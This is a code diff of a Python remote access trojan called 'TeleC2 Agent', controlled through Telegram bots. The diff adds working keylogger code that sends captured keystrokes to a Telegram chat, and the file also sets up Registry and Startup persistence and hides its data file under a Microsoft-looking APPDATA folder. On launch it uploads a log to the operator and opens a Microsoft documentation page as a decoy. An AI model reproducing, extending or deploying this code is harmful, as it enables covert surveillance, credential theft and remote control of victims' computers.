@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
-# TeleC2 Agent – Hardcoded token, persistent, debug log to Telegram, decoy URL
+# =============================================================================
+# TeleC2 Agent – Hardcoded token, persistence, debug log to Telegram, decoy URL
+# =============================================================================
 import cv2
 import time
 import telebot
@@ -19,7 +21,7 @@ import sys
 import base64
 import io
 import traceback
-import persistence
+import persistence          # Local module for Registry + Startup persistence
 
 # -----------------------------------------------------------------------------
 # Hardcoded Configuration
@@ -35,17 +37,19 @@ KEYLOGGER_CHAT_ID = ""
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
-# Global log buffer
+# Global log buffer (sent to Telegram before decoy URL)
 # -----------------------------------------------------------------------------
 log_lines = []
 
 def log(msg):
+    """Append a timestamped message to the runtime log."""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     line = f"[{timestamp}] {msg}"
     log_lines.append(line)
-    print(line)  # also goes to stdout if console were attached
+    print(line)   # would appear if console were attached
 
 def send_log_to_telegram(bot_instance):
+    """Upload the entire runtime log as Execution_log.txt to the operator."""
     if not log_lines:
         return
     try:
@@ -56,31 +60,24 @@ def send_log_to_telegram(bot_instance):
         bot_instance.send_document(TELEGRAM_USER_ID, bio)
         log("Execution log sent to Telegram")
     except Exception as e:
-        # can't log to Telegram if sending fails, just print
         print(f"Failed to send log: {e}")
 
 # -----------------------------------------------------------------------------
-# Persistence (already called at start)
-# -----------------------------------------------------------------------------
-
-# -----------------------------------------------------------------------------
-# Telegram bots
+# Telegram bot instances
 # -----------------------------------------------------------------------------
 bot = telebot.TeleBot(BOT_API_KEY)
 keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None
 
-# Agent management (unchanged structure, but with debug logs)
-agents_file = "agents.json"
+# -----------------------------------------------------------------------------
+# Agent management – store in a writable location (same as persistence)
+# -----------------------------------------------------------------------------
+appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
+agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
+os.makedirs(agents_dir, exist_ok=True)
+agents_file = os.path.join(agents_dir, 'agents.json')
+
 active_agents = {}
 agent_counter = 1
-
-# Keylogger variables
-keylogger_active = False
-keylogger_listener = None
-keystroke_buffer = ""
-MAX_BUFFER_LENGTH = 100
-last_send_time = time.time()
-SEND_INTERVAL = 60
 
 def load_agents():
     global active_agents, agent_counter
@@ -103,6 +100,137 @@ def save_agents():
     except Exception as e:
         log(f"Error saving agents: {e}")
 
+# -----------------------------------------------------------------------------
+# Keylogger variables and callbacks
+# -----------------------------------------------------------------------------
+keylogger_active = False
+keylogger_listener = None
+keystroke_buffer = ""
+MAX_BUFFER_LENGTH = 100
+last_send_time = time.time()
+SEND_INTERVAL = 60
+
+def on_press(key):
+    global keystroke_buffer, last_send_time
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            keystroke_buffer += key.char
+        elif key == keyboard.Key.space:
+            keystroke_buffer += " "
+        elif key == keyboard.Key.enter:
+            keystroke_buffer += "\n"
+        elif key == keyboard.Key.tab:
+            keystroke_buffer += "\t"
+        else:
+            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
+    except AttributeError:
+        keystroke_buffer += f"[{str(key)}]"
+    current_time = time.time()
+    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or 
+        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
+        send_keystrokes()
+
+def send_keystrokes():
+    global keystroke_buffer, last_send_time
+    if keystroke_buffer and keylogger_bot:
+        try:
+            system_id = get_system_id()
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
+            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
+            keystroke_buffer = ""
+            last_send_time = time.time()
+        except Exception as e:
+            print(f"Error sending keystrokes: {e}")
+
+def start_keylogger():
+    global keylogger_active, keylogger_listener
+    if keylogger_active:
+        return "Keylogger is already running"
+    if not keylogger_bot:
+        return "Keylogger bot not configured"
+    try:
+        keylogger_listener = keyboard.Listener(on_press=on_press)
+        keylogger_listener.start()
+        keylogger_active = True
+        def periodic_send():
+            while keylogger_active:
+                time.sleep(SEND_INTERVAL)
+                send_keystrokes()
+        threading.Thread(target=periodic_send, daemon=True).start()
+        log("Keylogger started")
+        return "Keylogger started successfully"
+    except Exception as e:
+        log(f"Keylogger start error: {e}")
+        return f"Failed to start keylogger: {str(e)}"
+
+def stop_keylogger():
+    global keylogger_active, keylogger_listener, keystroke_buffer
+    if not keylogger_active:
+        return "Keylogger is not running"
+    try:
+        keylogger_active = False
+        if keylogger_listener:
+            keylogger_listener.stop()
+        if keystroke_buffer:
+            send_keystrokes()
+        log("Keylogger stopped")
+        return "Keylogger stopped successfully"
+    except Exception as e:
+        log(f"Keylogger stop error: {e}")
+        return f"Failed to stop keylogger: {str(e)}"
+
+# Keylog cleaning utilities (original TeleC2)
+def apply_backspaces(s):
+    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
+    parts = pattern.split(s)
+    out = parts[0]
+    for seg in parts[1:]:
+        if out:
+            out = out[:-1]
+        out += seg
+    return out
+
+def process_special_keys(text):
+    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
+    return text
+
+def clean_keylogger_data(text):
+    text = apply_backspaces(text)
+    text = process_special_keys(text)
+    return text
+
+def clean_keylog_file(input_file, output_file):
+    try:
+        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+            raw_text = f.read()
+        cleaned_text = clean_keylogger_data(raw_text)
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(cleaned_text)
+        log(f"Cleaned keylog file {input_file} -> {output_file}")
+        return f"Successfully cleaned keylog file. Output written to {output_file}"
+    except Exception as e:
+        log(f"Keylog file cleaning error: {e}")
+        return f"Error cleaning file: {str(e)}"
+
+# -----------------------------------------------------------------------------
+# System identification and command execution
+# -----------------------------------------------------------------------------
 def get_system_id():
     hostname = execute_system_command("hostname").strip()
     username = execute_system_command("whoami").strip()
@@ -155,127 +283,6 @@ def get_clipboard():
         return "Could not access clipboard"
 
 # -----------------------------------------------------------------------------
-# Keylogger functions (exact original, only active if bot token provided)
-# -----------------------------------------------------------------------------
-def on_press(key):
-    global keystroke_buffer, last_send_time
-    try:
-        if hasattr(key, 'char') and key.char is not None:
-            keystroke_buffer += key.char
-        elif key == keyboard.Key.space:
-            keystroke_buffer += " "
-        elif key == keyboard.Key.enter:
-            keystroke_buffer += "\n"
-        elif key == keyboard.Key.tab:
-            keystroke_buffer += "\t"
-        else:
-            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
-    except AttributeError:
-        keystroke_buffer += f"[{str(key)}]"
-    current_time = time.time()
-    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or 
-        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
-        send_keystrokes()
-
-def send_keystrokes():
-    global keystroke_buffer, last_send_time
-    if keystroke_buffer and keylogger_bot:
-        try:
-            system_id = get_system_id()
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
-            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
-            keystroke_buffer = ""
-            last_send_time = time.time()
-        except Exception as e:
-            log(f"Keylogger send error: {e}")
-
-def start_keylogger():
-    global keylogger_active, keylogger_listener
-    if keylogger_active:
-        return "Keylogger is already running"
-    if not keylogger_bot:
-        return "Keylogger bot not configured"
-    try:
-        keylogger_listener = keyboard.Listener(on_press=on_press)
-        keylogger_listener.start()
-        keylogger_active = True
-        def periodic_send():
-            while keylogger_active:
-                time.sleep(SEND_INTERVAL)
-                send_keystrokes()
-        threading.Thread(target=periodic_send, daemon=True).start()
-        log("Keylogger started")
-        return "Keylogger started successfully"
-    except Exception as e:
-        log(f"Keylogger start error: {e}")
-        return f"Failed to start keylogger: {str(e)}"
-
-def stop_keylogger():
-    global keylogger_active, keylogger_listener, keystroke_buffer
-    if not keylogger_active:
-        return "Keylogger is not running"
-    try:
-        keylogger_active = False
-        if keylogger_listener:
-            keylogger_listener.stop()
-        if keystroke_buffer:
-            send_keystrokes()
-        log("Keylogger stopped")
-        return "Keylogger stopped successfully"
-    except Exception as e:
-        log(f"Keylogger stop error: {e}")
-        return f"Failed to stop keylogger: {str(e)}"
-
-# Keylog cleaning (full original implementations)
-def apply_backspaces(s):
-    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
-    parts = pattern.split(s)
-    out = parts[0]
-    for seg in parts[1:]:
-        if out:
-            out = out[:-1]
-        out += seg
-    return out
-
-def process_special_keys(text):
-    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
-    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
-    return text
-
-def clean_keylogger_data(text):
-    text = apply_backspaces(text)
-    text = process_special_keys(text)
-    return text
-
-def clean_keylog_file(input_file, output_file):
-    try:
-        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
-            raw_text = f.read()
-        cleaned_text = clean_keylogger_data(raw_text)
-        with open(output_file, 'w', encoding='utf-8') as f:
-            f.write(cleaned_text)
-        log(f"Cleaned keylog file {input_file} -> {output_file}")
-        return f"Successfully cleaned keylog file. Output written to {output_file}"
-    except Exception as e:
-        log(f"Keylog file cleaning error: {e}")
-        return f"Error cleaning file: {str(e)}"
-
-# -----------------------------------------------------------------------------
 # Agent registration
 # -----------------------------------------------------------------------------
 def register_agent():
@@ -309,7 +316,9 @@ def is_valid_agent_id(agent_id):
 def is_target_agent(agent_id):
     return agent_id == get_device_id()
 
-# File handling
+# -----------------------------------------------------------------------------
+# File handling utilities
+# -----------------------------------------------------------------------------
 def view_file_content(file_path):
     try:
         if not os.path.exists(file_path):
@@ -344,7 +353,7 @@ def download_file(file_path):
         return None, f"Error accessing file: {str(e)}"
 
 # -----------------------------------------------------------------------------
-# Telegram Command Handlers (all original except prank removed)
+# Telegram Bot Handlers
 # -----------------------------------------------------------------------------
 @bot.message_handler(commands=['start'])
 def start_command(message):
@@ -352,9 +361,8 @@ def start_command(message):
         return
     aid = register_agent()
     system_id = get_system_id()
-    response = (f"Agent registered with ID: {aid}\n"
-                f"System: {system_id}\n\n"
-                "Available agents:\nID  |  System\n-------------------\n")
+    response = f"Agent registered with ID: {aid}\nSystem: {system_id}\n\n"
+    response += "Available agents:\nID  |  System\n-------------------\n"
     for a_id, agent in active_agents.items():
         if agent['status'] == 'online':
             response += f"{a_id}  {agent['system_id']}\n"
@@ -694,7 +702,7 @@ def cleanup():
         send_keystrokes()
 
 # -----------------------------------------------------------------------------
-# Main Execution (debug log, persistence, log to Telegram, decoy URL)
+# Main Execution Flow
 # -----------------------------------------------------------------------------
 if __name__ == "__main__":
     log("=== Agent starting ===")
@@ -706,28 +714,28 @@ if __name__ == "__main__":
         except Exception as e:
             log(f"Persistence error: {traceback.format_exc()}")
 
-        # 2. Load previous agents
+        # 2. Load previous agents (from writable directory)
         load_agents()
 
         # 3. Register this agent
         agent_id = register_agent()
         log(f"Agent ID: {agent_id}")
 
-        # 4. Send execution log to Telegram
+        # 4. Send execution log to Telegram BEFORE any visual output
         log("Sending execution log to Telegram")
         send_log_to_telegram(bot)
 
-        # 5. Open decoy URL (last visual action)
+        # 5. Open decoy URL (silent, last action)
         log(f"Opening decoy URL: {DECOY_URL}")
-        os.system(f'start "" {DECOY_URL}')   # Windows only; works from hidden process
+        os.system(f'start "" {DECOY_URL}')
 
-        # 6. Start Telegram polling (this blocks until /die)
+        # 6. Enter main polling loop (blocks until /die)
         log("Entering main polling loop")
         bot.infinity_polling()
 
     except Exception as e:
         log(f"Fatal error: {traceback.format_exc()}")
-        # Try to send log even after fatal error
+        # Attempt to send log even after a crash
         try:
             send_log_to_telegram(bot)
         except:
